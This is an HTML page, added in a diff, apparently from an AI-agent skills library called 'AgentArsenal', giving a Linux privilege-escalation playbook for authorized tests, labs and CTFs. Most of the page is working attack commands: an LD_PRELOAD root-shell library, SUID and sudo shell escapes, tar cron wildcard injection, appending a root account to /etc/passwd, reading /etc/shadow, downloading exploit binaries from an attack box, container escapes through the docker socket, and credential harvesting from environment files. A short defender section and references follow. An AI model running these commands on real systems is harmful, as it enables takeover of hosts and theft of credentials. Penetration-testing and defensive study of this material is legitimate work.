@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: privesc-linux</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>privesc-linux</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you hold a low-privilege Linux shell on an authorized engagement, lab, or CTF and need a reliable path to root. Covers LinPEAS-driven enumeration plus a manual checklist: sudo misconfigurations (sudo -l, NOPASSWD entries, LD_PRELOAD tricks), SUID and SGID binaries with GTFOBins techniques, Linux capabilities such as cap_setuid and cap_dac_read_search, cron wildcard injection and PATH hijacking, writable scripts and shared libraries, kernel version triage for public exploits, and container escapes through the docker socket, privileged mode, and CAP_SYS_ADMIN. Emphasizes verification before exploitation, noise awareness, and evidence capture for reports.</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-windows.html">privesc-windows</a> <a href="linux-hardening.html">linux-hardening</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>linpeas</td><td>2.x</td></tr><tr><td>nmap</td><td>7.98</td></tr><tr><td>sudo</td><td>1.9.x</td></tr><tr><td>gcc</td><td>13.2.0</td></tr></tbody></table><p>Linux privilege escalation turns a low-privilege foothold into root on systems you are authorized to test. Enumeration decides the outcome: most Linux privesc wins come from misconfigurations (sudo rules, SUID binaries, cron jobs, capabilities, writable files), not zero-days. This skill gives you an ordered workflow: stabilize the shell, enumerate automatically with LinPEAS, verify every finding by hand, exploit the quietest reliable path, and capture evidence for the report. Kernel exploits are the last resort because they can crash the target, so treat them with explicit warnings and prefer snapshots.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Stabilize the shell and record the baseline: user, groups, kernel, distro, hostname, network position.</li>
+<li>Run LinPEAS for broad automated enumeration and exfiltrate the output for local analysis.</li>
+<li>Work the manual checklist in order: sudo, SUID/SGID, capabilities, cron, writable files, PATH, kernel version.</li>
+<li>Verify each candidate by hand before touching it (read the sudoers entry, confirm writability, inspect the cron script).</li>
+<li>Exploit the lowest-noise reliable path first: misconfiguration beats exploit code.</li>
+<li>Confirm root, capture proof (id, hostname), and record exact commands for the report.</li>
+<li>If the host is a container, pivot the checklist to container escapes (docker socket, privileged mode, mounted host paths).</li>
+</ol>
+<h2>Phase 1: Orientation and automated enumeration</h2>
+<p>Get oriented first. A stable shell makes everything else faster.</p>
+<pre><code class="language-bash">whoami; id; uname -a; cat /etc/os-release; hostname</code></pre>
+<p>If the shell is fragile, upgrade it:</p>
+<pre><code class="language-bash">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre>
+<p>Then on your local terminal: Ctrl+Z, run <code>stty raw -echo; fg</code>, then on target <code>export TERM=xterm</code>.</p>
+<p>Run LinPEAS and save the output. Never read thousands of lines inside a reverse shell; exfiltrate and grep locally.</p>
+<pre><code class="language-bash">curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
+chmod +x /tmp/lp.sh
+/tmp/lp.sh -a &gt; /tmp/lp.out 2&gt;&amp;1</code></pre>
+<pre><code class="language-bash">grep -iE &quot;CVE|password|backup|shadow|\.sh$&quot; /tmp/lp.out | head -40</code></pre>
+<p>The <code>-a</code> flag runs every check, which is slower and noisier. On a time-boxed test, run without <code>-a</code> first and escalate only if needed.</p>
+<p>Manual sweep to run even when LinPEAS is blocked:</p>
+<pre><code class="language-bash">sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron.d/; crontab -l 2&gt;/dev/null
+ls -la /opt /srv /home 2&gt;/dev/null
+env | sort; echo $PATH</code></pre>
+<h2>Phase 2: Sudo misconfigurations</h2>
+<p><code>sudo -l</code> is the single highest-value command in Linux privesc. Read every line of its output.</p>
+<pre><code class="language-bash">sudo -l
+sudo -n true</code></pre>
+<p>The second command tests passwordless sudo without triggering a password prompt. Look for:</p>
+<ul>
+<li><code>(ALL) NOPASSWD: ALL</code>: game over. <code>sudo su -</code> or <code>sudo /bin/bash</code>.</li>
+<li>NOPASSWD on editors or pagers (vim, less, man, more, nano): they all have shell escapes.</li>
+<li>NOPASSWD on scripting languages (python3, perl, ruby, awk): direct root shell.</li>
+<li>NOPASSWD on a script or binary you can write to: edit it, or use it to read and write as root.</li>
+<li><code>env_keep</code> including <code>LD_PRELOAD</code>: preload a malicious shared object.</li>
+</ul>
+<p>Pager and editor escapes:</p>
+<pre><code class="language-bash">sudo less /etc/hosts</code></pre>
+<p>Inside less, type <code>!/bin/sh</code> to drop to a root shell. For vim:</p>
+<pre><code class="language-bash">sudo vim -c &#x27;:!/bin/sh&#x27;</code></pre>
+<p>LD_PRELOAD abuse when sudo preserves the variable:</p>
+<pre><code class="language-bash">cat &gt; /tmp/p.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;unistd.h&gt;
+__attribute__((constructor)) void c(void){ setuid(0); setgid(0); system(&quot;/bin/bash&quot;); }
+EOF
+gcc -fPIC -shared -o /tmp/p.so /tmp/p.c -nostartfiles
+sudo LD_PRELOAD=/tmp/p.so /usr/bin/allowed-binary</code></pre>
+<p>Also check the sudo version itself for known CVEs (for example CVE-2021-3156 Baron Samedit affects sudo before 1.9.5p2):</p>
+<pre><code class="language-bash">sudo --version</code></pre>
+<h2>Phase 3: SUID and SGID binaries</h2>
+<p>List every SUID and SGID binary and compare against a known-good baseline. Anything custom or unusual is interesting.</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null | sort
+find / -perm -2000 -type f 2&gt;/dev/null | sort</code></pre>
+<p>Classic GTFOBins techniques for common SUID binaries:</p>
+<pre><code class="language-bash">find . -exec /bin/sh -p \; -quit</code></pre>
+<pre><code class="language-bash">less /etc/hosts</code></pre>
+<p>Inside less, type <code>!/bin/sh</code>.</p>
+<pre><code class="language-bash">vim -c &#x27;:!/bin/sh&#x27;
+bash -p</code></pre>
+<p>The <code>-p</code> flag matters: a SUID bash drops privileges unless <code>-p</code> keeps the effective UID. For old SUID nmap:</p>
+<pre><code class="language-bash">nmap --interactive</code></pre>
+<p>Then at the nmap prompt: <code>!sh</code>.</p>
+<p>Beyond the binary itself, check what it loads and what it touches:</p>
+<pre><code class="language-bash">ldd /usr/bin/custom-suid
+ls -la /usr/bin/custom-suid
+strings /usr/bin/custom-suid | grep -iE &quot;system\(|popen|/bin/sh|/tmp&quot; | head</code></pre>
+<p>A writable shared library in its <code>ldd</code> output, or a <code>system()</code> call with a relative path, is an escalation path: plant your own library or binary earlier in the search order.</p>
+<h2>Phase 4: Linux capabilities</h2>
+<p>Capabilities are finer-grained than SUID and easy to miss. Enumerate both the filesystem and the current process bounding set.</p>
+<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
+capsh --print | head -30</code></pre>
+<p>High-value capabilities and their abuse:</p>
+<ul>
+<li><code>cap_setuid+ep</code> on python3, perl, or ruby: become any UID, including root.</li>
+</ul>
+<pre><code class="language-bash">python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</code></pre>
+<ul>
+<li><code>cap_dac_read_search+ep</code> or <code>cap_dac_override+ep</code>: bypass file permission checks. Read <code>/etc/shadow</code> directly or overwrite sensitive files.</li>
+</ul>
+<pre><code class="language-bash">python3 -c &#x27;print(open(&quot;/etc/shadow&quot;).read())&#x27;</code></pre>
+<ul>
+<li><code>cap_sys_ptrace+ep</code>: attach to a root process with gdb and inject a shell.</li>
+<li><code>cap_sys_admin+ep</code>: broad; often leads to a full container or host escape.</li>
+</ul>
+<p>An empty <code>getcap</code> result is normal on hardened hosts. In containers, always check <code>capsh --print</code> too, because the container runtime may grant capabilities that no file carries.</p>
+<h2>Phase 5: Cron jobs and scheduled tasks</h2>
+<p>Cron jobs running as root are a classic path. Enumerate every cron source, then for each root entry ask: is the script writable, is its directory writable, does it call relative binaries, does it use wildcards.</p>
+<pre><code class="language-bash">cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /var/spool/cron/crontabs/ 2&gt;/dev/null
+crontab -l 2&gt;/dev/null
+systemctl list-timers --all 2&gt;/dev/null
+ps aux | grep -i cron</code></pre>
+<p>PATH hijacking: if a root cron script calls <code>tar</code> or another binary by relative name and you control an earlier PATH entry (or the script inherits a writable PATH), plant your own.</p>
+<p>Wildcard injection: if root cron runs something like <code>tar cf /backups/home.tar *</code> inside a directory you can write to, tar interprets filenames as options.</p>
+<pre><code class="language-bash">cd /path/where/tar/runs
+cat &gt; shell.sh &lt;&lt;&#x27;EOF&#x27;
+#!/bin/sh
+cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb
+EOF
+chmod +x shell.sh
+touch -- &#x27;--checkpoint=1&#x27;
+touch -- &#x27;--checkpoint-action=exec=sh shell.sh&#x27;</code></pre>
+<p>After cron fires, run <code>/tmp/rb -p</code> for a root shell. When debugging cron payloads, make the script log to a file you can read, because cron output otherwise goes nowhere visible:</p>
+<pre><code class="language-bash">* * * * * root /opt/job.sh &gt;&gt; /tmp/cron-debug.log 2&gt;&amp;1</code></pre>
+<p>Use absolute paths inside payloads: cron runs with a minimal environment and a bare PATH.</p>
+<h2>Phase 6: Writable files, services, and NFS</h2>
+<p>Hunt for files root trusts but you can modify:</p>
+<pre><code class="language-bash">find / -xdev -type f -writable -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null | head -50
+echo $PATH | tr &#x27;:&#x27; &#x27;\n&#x27; | xargs -I{} sh -c &#x27;test -w &quot;{}&quot; 2&gt;/dev/null &amp;&amp; echo &quot;WRITABLE: {}&quot;&#x27;
+ps auxf
+ss -tlnp 2&gt;/dev/null
+ls -la /etc/systemd/system/ 2&gt;/dev/null</code></pre>
+<p>High-value targets:</p>
+<ul>
+<li>Writable <code>/etc/passwd</code>: append a root user.</li>
+</ul>
+<pre><code class="language-bash">openssl passwd -1 &#x27;newpassword&#x27;
+echo &#x27;evil:$1$abcd$xxxxxxxxxxxxxxxxxxxxxx:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd
+su evil</code></pre>
+<ul>
+<li>Writable service binary or systemd unit: modify it, then restart the service (or wait for reboot). Check <code>systemctl cat &lt;service&gt;</code> to see exactly what runs.</li>
+<li>Writable <code>/etc/ld.so.preload</code>: every new process loads your library as root. Rare, instantly fatal.</li>
+<li>NFS with <code>no_root_squash</code>: check <code>/etc/exports</code>. From your attack box, mount the share, drop a SUID-root binary, and run it on the target.</li>
+</ul>
+<pre><code class="language-bash">cat /etc/exports
+showmount -e &lt;target&gt; 2&gt;/dev/null</code></pre>
+<h2>Phase 7: Kernel and software exploits</h2>
+<p>Only reach for kernel exploits after misconfigurations are exhausted. Warning: a failed kernel exploit can panic the host and destroy the engagement. Use snapshots when you have them, compile on your attack box, and never run untrusted exploit code against production without explicit written approval.</p>
+<pre><code class="language-bash">uname -r; cat /etc/os-release
+dpkg -l 2&gt;/dev/null | grep -iE &quot;linux-image|libc6|sudo|polkit&quot; | head</code></pre>
+<p>On your attack box, match the exact kernel version (including the distro suffix) against public exploits:</p>
+<pre><code class="language-bash">searchsploit &quot;linux kernel 5.4&quot; | head -20</code></pre>
+<p>Compile for the target architecture and transfer the binary:</p>
+<pre><code class="language-bash">gcc -o exploit exploit.c -static
+python3 -m http.server 8000</code></pre>
+<pre><code class="language-bash">curl http://&lt;attack-box&gt;:8000/exploit -o /tmp/exploit &amp;&amp; chmod +x /tmp/exploit</code></pre>
+<p>If the target has no compiler, static compilation on your box is the standard answer. Verify the exploit targets your exact version before running; nearby versions often fail or crash.</p>
+<h2>Phase 8: Container escapes</h2>
+<p>Detect the container first, then pivot the whole checklist:</p>
+<pre><code class="language-bash">ls -la /.dockerenv 2&gt;/dev/null
+cat /proc/1/cgroup 2&gt;/dev/null | head
+capsh --print | grep -iE &quot;cap_sys_admin|cap_dac&quot;
+ls -la /var/run/docker.sock 2&gt;/dev/null
+mount | grep -iE &quot;docker|overlay&quot;</code></pre>
+<p>Escape paths, quietest first:</p>
+<ul>
+<li>Docker socket mounted inside the container: talk to the host daemon.</li>
+</ul>
+<pre><code class="language-bash">docker run --rm -it -v /:/host alpine chroot /host bash</code></pre>
+<ul>
+<li>Privileged container or CAP_SYS_ADMIN: mount the host disk directly.</li>
+</ul>
+<pre><code class="language-bash">fdisk -l 2&gt;/dev/null | grep Disk
+mkdir -p /tmp/m &amp;&amp; mount /dev/sda1 /tmp/m</code></pre>
+<ul>
+<li>Writable hostPath volume: write a cron job or an SSH authorized_keys file onto the host filesystem.</li>
+<li>The classic cgroup release_agent escape still works where CAP_SYS_ADMIN is present and cgroups v1 is mounted writable.</li>
+<li>Kernel exploits run against the shared host kernel, so a container on a vulnerable kernel is a host compromise.</li>
+</ul>
+<p>Group membership shortcuts that are root-equivalent: the <code>docker</code> group and the <code>lxd</code>/<code>lxc</code> group. Check <code>id</code> early.</p>
+<pre><code class="language-bash">id | grep -E &quot;docker|lxd&quot;
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>LinPEAS output is huge: save to a file, exfiltrate it, and grep locally. Never page through thousands of lines in a reverse shell.</li>
+<li><code>sudo -l</code> prompts for a password: try <code>sudo -n -l</code> (non-interactive) or test for a cached timestamp with <code>sudo -n true</code>.</li>
+<li>A SUID binary looks promising but has no GTFOBins entry: run <code>strings</code> and <code>ltrace</code> on it, especially custom in-house binaries, which are often the intended path.</li>
+<li>Your cron payload never fires: cron has a minimal environment, so use absolute paths everywhere and add logging (<code>&gt;&gt; /tmp/debug.log 2&gt;&amp;1</code>) to see what actually happened.</li>
+<li>No compiler on target: compile statically on your attack box for the right architecture, or rewrite the exploit in a language already installed (python3, perl).</li>
+<li>Capabilities look empty but you are in a container: check <code>capsh --print</code>, the runtime may grant capabilities no file carries.</li>
+<li>An exploit works in the lab but crashes the target: kernel build options (SMEP, SMAP, KASLR) differ. Match <code>uname -r</code> exactly, including the distro suffix, and treat each run as potentially destructive.</li>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Enumeration finds nothing: pivot to localhost-only network services (<code>ss -tlnp</code>) and port-forward them. Databases, debug ports, and admin panels bound to 127.0.0.1 are common second footholds.</li>
+<li>You have a writable script but no trigger: check logrotate configs, package maintainer scripts, login hooks (<code>.bashrc</code>, motd scripts), and backup jobs run by admins on a schedule.</li>
+<li>Stuck as a service user like www-data: read web application configs for database and cloud credentials, then test password reuse with <code>su</code>. Users reuse passwords constantly.</li>
+<li>Kernel path fails: re-sweep misconfigurations with fresh eyes, especially NFS exports, LXD group membership, and docker group membership.</li>
+<li>Nothing local works: check for credentials in shell history, config files, and environment variables (<code>env</code>, <code>/proc/*/environ</code> where readable). One reused password often beats every exploit.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<ul>
+<li>Sudo logs every invocation to the auth log. Unexpected <code>sudo -l</code> probing and first-time NOPASSWD use stand out clearly.</li>
+<li>New SUID binaries and mode changes are caught by file integrity monitoring (AIDE, Wazuh FIM, osquery file table).</li>
+<li>Cron persistence shows in <code>/etc/cron.d</code> and systemd timers. Auditd rules on cron directories and on <code>crontab</code> execution catch it.</li>
+<li>LD_PRELOAD attacks leave the <code>.so</code> on disk and appear in process environments. Auditd execve logging catches the compiler invocations that build them.</li>
+<li>Container escapes through the docker socket are visible in the Docker daemon audit log. Privileged containers should never exist in production.</li>
+<li>Defenders shrink this entire attack class with a minimal SUID footprint, no NOPASSWD rules, read-only cron directories, dropped capabilities, user namespaces, and patched kernels. See linux-hardening for the full checklist.</li>
+</ul>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK: T1068 (Exploitation for Privilege Escalation), T1548.001 (Setuid and Setgid), T1548.003 (Sudo and Sudo Caching), T1053.003 (Cron), T1574 (Hijack Execution Flow), T1611 (Escape to Host), T1552.001 (Credentials In Files), T1037 (Boot or Logon Initialization Scripts).</li>
+<li>CWE: CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-426 (Untrusted Search Path), CWE-427 (Uncontrolled Search Path Element), CWE-367 (Time-of-check Time-of-use Race Condition), CWE-798 (Use of Hard-coded Credentials), CWE-59 (Improper Link Resolution Before File Access).</li>
+<li>Tool docs: PEASS-ng LinPEAS (github.com/peass-ng/PEASS-ng), GTFOBins (gtfobins.github.io).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
